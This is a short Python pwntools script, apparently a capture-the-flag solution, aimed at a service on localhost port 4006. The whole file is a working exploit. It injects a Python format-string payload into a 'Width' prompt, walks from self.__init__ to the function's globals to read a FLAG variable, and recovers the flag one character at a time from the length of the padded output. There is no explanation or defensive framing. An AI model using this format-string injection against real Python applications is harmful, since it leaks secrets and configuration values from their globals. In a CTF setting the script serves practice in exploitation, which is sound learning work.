#!/usr/bin/env python3

from pwn import *

HOST, PORT = "localhost", 4006

if __name__ == "__main__":
    flag = ''
    idx = 0
    char = ''

    while char != '}':
        io = remote(HOST, PORT, level=logging.CRITICAL)
        payload = f"{{self.__init__.__func__.__globals__[FLAG][{idx}]}}"
        io.sendlineafter("Name: ", "any")
        io.sendlineafter("Width: ", payload)
        line = io.recvline().decode()
        padded_name = re.search(r"CTF\((.*)\)", line).groups()[0]
        char = chr(len(padded_name))
        flag += char
        idx += 1
        log.info(f"Flag: {flag}")
        io.close()

    log.success(f"Flag : {flag}")
